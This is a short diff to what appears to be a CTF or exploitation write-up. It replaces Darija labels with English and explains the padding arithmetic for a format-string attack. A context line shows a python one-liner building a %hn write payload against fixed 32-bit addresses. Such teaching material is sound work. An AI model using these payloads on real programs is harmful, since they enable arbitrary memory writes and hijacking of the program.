@@ -74,14 +74,14 @@ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%319
 
 
 
-9a3ida:
+Rule:
 ```
     0x0804a004
 
     upper = 0x0804 => 2052
     lower = 0xa004 => 40964
 
-    uper - dakchiliprintiti9bl = 2052 - 8 = 2044
+    uper - <previously printed> = 2052 - 8 = 2044
 
     lower - upper = 40964 - 2052 = 38912
 ```
